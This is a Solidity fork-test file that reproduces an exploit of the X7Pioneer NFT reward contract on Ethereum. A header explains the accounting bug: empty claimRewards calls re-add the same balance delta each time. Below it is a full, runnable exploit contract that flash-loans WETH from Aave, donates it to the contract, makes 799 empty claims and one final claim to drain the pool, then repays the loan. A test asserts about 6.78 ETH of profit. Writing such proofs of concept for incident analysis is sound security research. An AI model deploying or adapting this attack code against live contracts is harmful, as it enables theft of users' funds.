// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";

/*//////////////////////////////////////////////////////////////////////////
                         X7 Finance (X7Pioneer) exploit
////////////////////////////////////////////////////////////////////////////

Incident      : X7 Finance — X7Pioneer NFT reward-distribution drain
Chain         : Ethereum mainnet (chainId 1)
Attack tx     : 0xc98056d6ab55ef898189da5fa1fb08b968cb84ca99528d171f8240836b21766d
Block         : 26146922   (2026-10-08 UTC)   fork at 26146921
Attacker EOA  : 0xc79352119a7cf6efbfabbd7e6b013b79687bacf2
Victim        : X7Pioneer  0x70000299ee8910ccacd97b1bb560e34f49c9e4f7
                (verified, solc 0.8.15, ERC-721 + ETH reward pool)
Reported loss : ~6.78 ETH
Alert         : https://x.com/SlowMist_Team/status/2108142452888776907

ROOT CAUSE
----------
X7Pioneer.claimRewards(uint256[] tokenIds) accrues new rewards on EVERY call:

    if (lastETHBalance < address(this).balance) {
        totalRewards += (address(this).balance - lastETHBalance);   // runs always
    }
    ...
    if (claimable > 0) {
        lastETHBalance = address(this).balance - claimable;         // only on non-empty claim
        (bool ok, ) = msg.sender.call{value: claimable}("");
        require(ok);
    }

`lastETHBalance` is the accrual watermark, but it is ONLY advanced inside the
`claimable > 0` branch. Calling claimRewards([]) with an EMPTY array leaves
claimable == 0, so the watermark is never moved — yet the accrual line at the
top has already re-added the SAME (balance - lastETHBalance) delta to
totalRewards. Each empty call therefore double-counts the same donated ETH,
inflating totalRewards (and hence totalRewards / totalSupply() paid per token)
without bound.

ATTACK SEQUENCE (reproduced faithfully below)
---------------------------------------------
 1. Attacker owns X7Pioneer token #300 (previously transfer-unlocked).
 2. Flash-loan 26.96317 WETH from Aave V3, unwrap to ETH.
 3. DONATE the 26.96317 ETH to X7Pioneer, creating delta = balance - lastETHBalance.
 4. Call claimRewards([]) 799 times — each re-adds the 26.96 ETH delta to
    totalRewards (watermark never advances).
 5. Call claimRewards([300]) once: the accrual adds the delta a final time
    (800 deltas total), totalRewards/totalSupply() now exceeds the contract
    balance, and the whole pool (~33.76 ETH) is paid out for a single token.
 6. Repay the flash loan (principal + 0.05% premium); keep ~6.78 ETH profit.

Note: the real attacker wrapped this in a bespoke deployer + child contract and
a pre-approved NFT transfer. That orchestration is not the vulnerability, so the
PoC drives the exact same victim calls from a single standalone exploit contract
(X7Exploit) with one `attack()` entrypoint. The test funds that exploit with
token #300 the real way — a pranked transfer from the genuine unlocked owner
(token #300 has transferUnlocked==true on-chain, so no vm.store is needed) — and
then calls attack(). The Playground's setup.steps replace the one cheatcode
(the pranked NFT transfer); the recorded call is attack().
*/

interface IX7Pioneer {
    function claimRewards(uint256[] memory tokenIds) external;
    function totalRewards() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function lastETHBalance() external view returns (uint256);
    function rewardsClaimed(uint256 tokenId) external view returns (uint256);
    function ownerOf(uint256 tokenId) external view returns (address);
    function transferFrom(address from, address to, uint256 tokenId) external;
}

interface IWETH {
    function deposit() external payable;
    function withdraw(uint256) external;
    function approve(address, uint256) external returns (bool);
}

interface IAavePool {
    function flashLoanSimple(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

// Standalone exploit contract: ONE `attack()` entrypoint performs the whole
// recorded attack (flash loan -> donate -> 799 empty claims -> final claim ->
// repay). It must already own X7Pioneer token #300 before attack() is called.
contract X7Exploit {
    IX7Pioneer constant PIONEER = IX7Pioneer(0x70000299Ee8910cCaCD97B1bB560E34F49c9e4f7);
    IWETH constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IAavePool constant AAVE = IAavePool(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);

    uint256 constant TOKEN_ID = 300;
    uint256 constant FLASH_AMOUNT = 26_963_170_607_692_677_032; // 26.96317 WETH, as on-chain

    function attack() external {
        // (2) Flash-loan WETH from Aave V3; the drain happens in the callback.
        AAVE.flashLoanSimple(address(this), address(WETH), FLASH_AMOUNT, "", 0);
    }

    // Aave V3 flash-loan callback.
    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address, /*initiator*/
        bytes calldata /*params*/
    ) external returns (bool) {
        require(msg.sender == address(AAVE), "only pool");
        require(asset == address(WETH), "asset");

        // Unwrap the flash-loaned WETH into native ETH.
        WETH.withdraw(amount);

        // (3) Donate the ETH to X7Pioneer -> delta = balance - lastETHBalance.
        (bool ok,) = address(PIONEER).call{value: amount}("");
        require(ok, "donate failed");

        // (4) Inflate totalRewards: 799 empty claims, each re-adds the same delta
        // because lastETHBalance is never advanced on an empty claim.
        uint256[] memory empty = new uint256[](0);
        for (uint256 i = 0; i < 799; i++) {
            PIONEER.claimRewards(empty);
        }

        // (5) Drain: the final claim adds the delta one more time (800 total) and
        // pays out totalRewards/totalSupply() ~= the whole contract balance.
        uint256[] memory one = new uint256[](1);
        one[0] = TOKEN_ID;
        PIONEER.claimRewards(one);

        // (6) Repay principal + premium.
        uint256 owed = amount + premium;
        WETH.deposit{value: owed}();
        WETH.approve(address(AAVE), owed);
        return true;
    }

    receive() external payable {}
}

contract X7FinanceExploit is BaseTestWithBalanceLog {
    IX7Pioneer constant PIONEER = IX7Pioneer(0x70000299Ee8910cCaCD97B1bB560E34F49c9e4f7);

    address constant REAL_OWNER = 0xC79352119A7cF6EFbFaBBD7e6b013B79687BaCf2; // attacker EOA, real owner of #300
    uint256 constant TOKEN_ID = 300;

    X7Exploit exploit;

    function setUp() public {
        vm.createSelectFork("https://eth.drpc.org", 26_146_921);

        // Deploy the standalone exploit contract.
        exploit = new X7Exploit();

        // Acquire token #300 the real way: it is transferUnlocked on-chain, so its
        // genuine owner can transfer it straight to the exploit contract. No forgery.
        require(PIONEER.ownerOf(TOKEN_ID) == REAL_OWNER, "owner mismatch");
        vm.prank(REAL_OWNER);
        PIONEER.transferFrom(REAL_OWNER, address(exploit), TOKEN_ID);
        require(PIONEER.ownerOf(TOKEN_ID) == address(exploit), "exploit did not receive NFT");

        // Measure realized profit on the exploit contract (where the ETH lands).
        attacker = address(exploit);
    }

    function testExploit() public balanceLog {
        exploit.attack();

        uint256 profit = address(exploit).balance;
        emit log_named_decimal_uint("Realized profit (ETH)", profit, 18);

        // Exact on-chain realized profit: claim (33.756919822234785) - principal
        // (26.963170607692677032) - Aave 0.05% premium (0.013481585303846338).
        assertApproxEqRel(profit, 6_780_267_629_238_261_775, 0.01e18, "profit != ~6.78 ETH");
    }
}
